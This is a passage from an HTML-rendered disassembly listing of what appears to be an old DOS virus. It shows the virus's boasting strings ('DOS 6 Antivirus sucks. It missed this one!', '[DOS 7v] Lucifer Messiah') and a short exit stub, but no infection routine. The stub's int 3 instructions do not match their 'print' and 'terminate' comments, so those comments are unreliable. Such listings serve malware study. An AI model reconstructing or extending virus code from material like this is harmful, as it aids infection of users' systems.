</span><span style="color:olive">seg000:024C </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:024D </span>4D                                      <span style="color:navy">db  </span><span style="color:#008040">4Dh </span><span style="color:gray">; M
</span><span style="color:olive">seg000:024E </span>53                                      <span style="color:navy">db  </span><span style="color:#008040">53h </span><span style="color:gray">; S
</span><span style="color:olive">seg000:024F </span>44                                      <span style="color:navy">db  </span><span style="color:#008040">44h </span><span style="color:gray">; D
</span><span style="color:olive">seg000:0250 </span>4F                                      <span style="color:navy">db  </span><span style="color:#008040">4Fh </span><span style="color:gray">; O
</span><span style="color:olive">seg000:0251 </span>53                                      <span style="color:navy">db  </span><span style="color:#008040">53h </span><span style="color:gray">; S
</span><span style="color:olive">seg000:0252 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:0253 </span>37                                      <span style="color:navy">db  </span><span style="color:#008040">37h </span><span style="color:gray">; 7
</span><span style="color:olive">seg000:0254 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:0255 </span>28                                      <span style="color:navy">db  </span><span style="color:#008040">28h </span><span style="color:gray">; (
</span><span style="color:olive">seg000:0256 </span>43                                      <span style="color:navy">db  </span><span style="color:#008040">43h </span><span style="color:gray">; C
</span><span style="color:olive">seg000:0257 </span>29                                      <span style="color:navy">db  </span><span style="color:#008040">29h </span><span style="color:gray">; )
</span><span style="color:olive">seg000:0258 </span>31                                      <span style="color:navy">db  </span><span style="color:#008040">31h </span><span style="color:gray">; 1
</span><span style="color:olive">seg000:0259 </span>39                                      <span style="color:navy">db  </span><span style="color:#008040">39h </span><span style="color:gray">; 9
</span><span style="color:olive">seg000:025A </span>39                                      <span style="color:navy">db  </span><span style="color:#008040">39h </span><span style="color:gray">; 9
</span><span style="color:olive">seg000:025B </span>33                                      <span style="color:navy">db  </span><span style="color:#008040">33h </span><span style="color:gray">; 3
</span><span style="color:olive">seg000:025C </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:025D </span>41                                      <span style="color:navy">db  </span><span style="color:#008040">41h </span><span style="color:gray">; A
</span><span style="color:olive">seg000:025E </span>4E                                      <span style="color:navy">db  </span><span style="color:#008040">4Eh </span><span style="color:gray">; N
</span><span style="color:olive">seg000:025F </span>41                                      <span style="color:navy">db  </span><span style="color:#008040">41h </span><span style="color:gray">; A
</span><span style="color:olive">seg000:0260 </span>52                                      <span style="color:navy">db  </span><span style="color:#008040">52h </span><span style="color:gray">; R
</span><span style="color:olive">seg000:0261 </span>4B                                      <span style="color:navy">db  </span><span style="color:#008040">4Bh </span><span style="color:gray">; K
</span><span style="color:olive">seg000:0262 </span>49                                      <span style="color:navy">db  </span><span style="color:#008040">49h </span><span style="color:gray">; I
</span><span style="color:olive">seg000:0263 </span>43                                      <span style="color:navy">db  </span><span style="color:#008040">43h </span><span style="color:gray">; C
</span><span style="color:olive">seg000:0264 </span>4B                                      <span style="color:navy">db  </span><span style="color:#008040">4Bh </span><span style="color:gray">; K
</span><span style="color:olive">seg000:0265 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:0266 </span>53                                      <span style="color:navy">db  </span><span style="color:#008040">53h </span><span style="color:gray">; S
</span><span style="color:olive">seg000:0267 </span>59                                      <span style="color:navy">db  </span><span style="color:#008040">59h </span><span style="color:gray">; Y
</span><span style="color:olive">seg000:0268 </span>53                                      <span style="color:navy">db  </span><span style="color:#008040">53h </span><span style="color:gray">; S
</span><span style="color:olive">seg000:0269 </span>54                                      <span style="color:navy">db  </span><span style="color:#008040">54h </span><span style="color:gray">; T
</span><span style="color:olive">seg000:026A </span>45                                      <span style="color:navy">db  </span><span style="color:#008040">45h </span><span style="color:gray">; E
</span><span style="color:olive">seg000:026B </span>4D                                      <span style="color:navy">db  </span><span style="color:#008040">4Dh </span><span style="color:gray">; M
</span><span style="color:olive">seg000:026C </span>53                                      <span style="color:navy">db  </span><span style="color:#008040">53h </span><span style="color:gray">; S
</span><span style="color:olive">seg000:026D </span>0D                                      <span style="color:navy">db  </span><span style="color:#008040">0Dh
</span><span style="color:olive">seg000:026E </span>0A                                      <span style="color:navy">db  </span><span style="color:#008040">0Ah
</span><span style="color:olive">seg000:026F </span>01                                      <span style="color:navy">db    </span><span style="color:#008040">1
</span><span style="color:olive">seg000:0270 </span>01                                      <span style="color:navy">db    </span><span style="color:#008040">1
</span><span style="color:olive">seg000:0271 </span>01                                      <span style="color:navy">db    </span><span style="color:#008040">1
</span><span style="color:olive">seg000:0272 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:0273 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:0274 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:0275 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:0276 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:0277 </span>44                                      <span style="color:navy">db  </span><span style="color:#008040">44h </span><span style="color:gray">; D
</span><span style="color:olive">seg000:0278 </span>4F                                      <span style="color:navy">db  </span><span style="color:#008040">4Fh </span><span style="color:gray">; O
</span><span style="color:olive">seg000:0279 </span>53                                      <span style="color:navy">db  </span><span style="color:#008040">53h </span><span style="color:gray">; S
</span><span style="color:olive">seg000:027A </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:027B </span>36                                      <span style="color:navy">db  </span><span style="color:#008040">36h </span><span style="color:gray">; 6
</span><span style="color:olive">seg000:027C </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:027D </span>41                                      <span style="color:navy">db  </span><span style="color:#008040">41h </span><span style="color:gray">; A
</span><span style="color:olive">seg000:027E </span>6E                                      <span style="color:navy">db  </span><span style="color:#008040">6Eh </span><span style="color:gray">; n
</span><span style="color:olive">seg000:027F </span>74                                      <span style="color:navy">db  </span><span style="color:#008040">74h </span><span style="color:gray">; t
</span><span style="color:olive">seg000:0280 </span>69                                      <span style="color:navy">db  </span><span style="color:#008040">69h </span><span style="color:gray">; i
</span><span style="color:olive">seg000:0281 </span>76                                      <span style="color:navy">db  </span><span style="color:#008040">76h </span><span style="color:gray">; v
</span><span style="color:olive">seg000:0282 </span>69                                      <span style="color:navy">db  </span><span style="color:#008040">69h </span><span style="color:gray">; i
</span><span style="color:olive">seg000:0283 </span>72                                      <span style="color:navy">db  </span><span style="color:#008040">72h </span><span style="color:gray">; r
</span><span style="color:olive">seg000:0284 </span>75                                      <span style="color:navy">db  </span><span style="color:#008040">75h </span><span style="color:gray">; u
</span><span style="color:olive">seg000:0285 </span>73                                      <span style="color:navy">db  </span><span style="color:#008040">73h </span><span style="color:gray">; s
</span><span style="color:olive">seg000:0286 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:0287 </span>73                                      <span style="color:navy">db  </span><span style="color:#008040">73h </span><span style="color:gray">; s
</span><span style="color:olive">seg000:0288 </span>75                                      <span style="color:navy">db  </span><span style="color:#008040">75h </span><span style="color:gray">; u
</span><span style="color:olive">seg000:0289 </span>63                                      <span style="color:navy">db  </span><span style="color:#008040">63h </span><span style="color:gray">; c
</span><span style="color:olive">seg000:028A </span>6B                                      <span style="color:navy">db  </span><span style="color:#008040">6Bh </span><span style="color:gray">; k
</span><span style="color:olive">seg000:028B </span>73                                      <span style="color:navy">db  </span><span style="color:#008040">73h </span><span style="color:gray">; s
</span><span style="color:olive">seg000:028C </span>2E                                      <span style="color:navy">db  </span><span style="color:#008040">2Eh </span><span style="color:gray">; .
</span><span style="color:olive">seg000:028D </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:028E </span>49                                      <span style="color:navy">db  </span><span style="color:#008040">49h </span><span style="color:gray">; I
</span><span style="color:olive">seg000:028F </span>74                                      <span style="color:navy">db  </span><span style="color:#008040">74h </span><span style="color:gray">; t
</span><span style="color:olive">seg000:0290 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:0291 </span>6D                                      <span style="color:navy">db  </span><span style="color:#008040">6Dh </span><span style="color:gray">; m
</span><span style="color:olive">seg000:0292 </span>69                                      <span style="color:navy">db  </span><span style="color:#008040">69h </span><span style="color:gray">; i
</span><span style="color:olive">seg000:0293 </span>73                                      <span style="color:navy">db  </span><span style="color:#008040">73h </span><span style="color:gray">; s
</span><span style="color:olive">seg000:0294 </span>73                                      <span style="color:navy">db  </span><span style="color:#008040">73h </span><span style="color:gray">; s
</span><span style="color:olive">seg000:0295 </span>65                                      <span style="color:navy">db  </span><span style="color:#008040">65h </span><span style="color:gray">; e
</span><span style="color:olive">seg000:0296 </span>64                                      <span style="color:navy">db  </span><span style="color:#008040">64h </span><span style="color:gray">; d
</span><span style="color:olive">seg000:0297 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:0298 </span>74                                      <span style="color:navy">db  </span><span style="color:#008040">74h </span><span style="color:gray">; t
</span><span style="color:olive">seg000:0299 </span>68                                      <span style="color:navy">db  </span><span style="color:#008040">68h </span><span style="color:gray">; h
</span><span style="color:olive">seg000:029A </span>69                                      <span style="color:navy">db  </span><span style="color:#008040">69h </span><span style="color:gray">; i
</span><span style="color:olive">seg000:029B </span>73                                      <span style="color:navy">db  </span><span style="color:#008040">73h </span><span style="color:gray">; s
</span><span style="color:olive">seg000:029C </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:029D </span>6F                                      <span style="color:navy">db  </span><span style="color:#008040">6Fh </span><span style="color:gray">; o
</span><span style="color:olive">seg000:029E </span>6E                                      <span style="color:navy">db  </span><span style="color:#008040">6Eh </span><span style="color:gray">; n
</span><span style="color:olive">seg000:029F </span>65                                      <span style="color:navy">db  </span><span style="color:#008040">65h </span><span style="color:gray">; e
</span><span style="color:olive">seg000:02A0 </span>21                                      <span style="color:navy">db  </span><span style="color:#008040">21h </span><span style="color:gray">; !
</span><span style="color:olive">seg000:02A1 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:02A2 </span>24                                      <span style="color:navy">db  </span><span style="color:#008040">24h </span><span style="color:gray">; $
</span><span style="color:maroon">seg000:02A3                         </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:02A3 </span>B4 09                                   <span style="color:navy">mov     ah, </span><span style="color:green">9           </span>; print to stdout
<span style="color:maroon">seg000:02A5 </span>BA 09 01                                <span style="color:navy">mov     dx, </span><span style="color:#ff8000">109h        </span>; message location in memory
<span style="color:maroon">seg000:02A8 </span>CC                                      <span style="color:navy">int     </span><span style="color:green">3               </span>; print &quot;[DOS 7v] Lucifer Messiah&quot;
<span style="color:maroon">seg000:02A9 </span>B4 4C                                   <span style="color:navy">mov     ah, </span><span style="color:green">4Ch </span><span style="color:gray">; &#039;L&#039;   </span>; terminate process
<span style="color:maroon">seg000:02AB </span>CC                                      <span style="color:navy">int     </span><span style="color:green">3               </span>; terminate
<span style="color:maroon">seg000:02AB                         </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:olive">seg000:02AC </span>5B                                      <span style="color:navy">db  </span><span style="color:#008040">5Bh </span><span style="color:gray">; [
</span><span style="color:olive">seg000:02AD </span>44                                      <span style="color:navy">db  </span><span style="color:#008040">44h </span><span style="color:gray">; D
</span><span style="color:olive">seg000:02AE </span>4F                                      <span style="color:navy">db  </span><span style="color:#008040">4Fh </span><span style="color:gray">; O
</span><span style="color:olive">seg000:02AF </span>53                                      <span style="color:navy">db  </span><span style="color:#008040">53h </span><span style="color:gray">; S
</span><span style="color:olive">seg000:02B0 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:02B1 </span>37                                      <span style="color:navy">db  </span><span style="color:#008040">37h </span><span style="color:gray">; 7
</span><span style="color:olive">seg000:02B2 </span>76                                      <span style="color:navy">db  </span><span style="color:#008040">76h </span><span style="color:gray">; v
</span><span style="color:olive">seg000:02B3 </span>01                                      <span style="color:navy">db    </span><span style="color:#008040">1
</span><span style="color:olive">seg000:02B4 </span>01                                      <span style="color:navy">db    </span><span style="color:#008040">1
</span><span style="color:olive">seg000:02B5 </span>01                                      <span style="color:navy">db    </span><span style="color:#008040">1
</span><span style="color:olive">seg000:02B6 </span>5D                                      <span style="color:navy">db  </span><span style="color:#008040">5Dh </span><span style="color:gray">; ]
</span><span style="color:olive">seg000:02B7 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:02B8 </span>4C                                      <span style="color:navy">db  </span><span style="color:#008040">4Ch </span><span style="color:gray">; L
</span><span style="color:olive">seg000:02B9 </span>75                                      <span style="color:navy">db  </span><span style="color:#008040">75h </span><span style="color:gray">; u
</span><span style="color:olive">seg000:02BA </span>63                                      <span style="color:navy">db  </span><span style="color:#008040">63h </span><span style="color:gray">; c
</span><span style="color:olive">seg000:02BB </span>69                                      <span style="color:navy">db  </span><span style="color:#008040">69h </span><span style="color:gray">; i
</span><span style="color:olive">seg000:02BC </span>66                                      <span style="color:navy">db  </span><span style="color:#008040">66h </span><span style="color:gray">; f
</span><span style="color:olive">seg000:02BD </span>65                                      <span style="color:navy">db  </span><span style="color:#008040">65h </span><span style="color:gray">; e
</span><span style="color:olive">seg000:02BE </span>72                                      <span style="color:navy">db  </span><span style="color:#008040">72h </span><span style="color:gray">; r
</span><span style="color:olive">seg000:02BF </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:02C0 </span>4D                                      <span style="color:navy">db  </span><span style="color:#008040">4Dh </span><span style="color:gray">; M
</span><span style="color:olive">seg000:02C1 </span>65                                      <span style="color:navy">db  </span><span style="color:#008040">65h </span><span style="color:gray">; e
</span><span style="color:olive">seg000:02C2 </span>73                                      <span style="color:navy">db  </span><span style="color:#008040">73h </span><span style="color:gray">; s
</span><span style="color:olive">seg000:02C3 </span>73                                      <span style="color:navy">db  </span><span style="color:#008040">73h </span><span style="color:gray">; s
</span><span style="color:olive">seg000:02C4 </span>69                                      <span style="color:navy">db  </span><span style="color:#008040">69h </span><span style="color:gray">; i
</span><span style="color:olive">seg000:02C5 </span>61                                      <span style="color:navy">db  </span><span style="color:#008040">61h </span><span style="color:gray">; a
</span><span style="color:olive">seg000:02C6 </span>68                                      <span style="color:navy">db  </span><span style="color:#008040">68h </span><span style="color:gray">; h
</span><span style="color:olive">seg000:02C7 </span>24                                      <span style="color:navy">db  </span><span style="color:#008040">24h </span><span style="color:gray">; $
</span><span style="color:olive">seg000:02C7                         </span>seg000          ends
<span style="color:olive">seg000:02C7
seg000:02C7
seg000:02C7                                         </span>end start
</span></body></html>
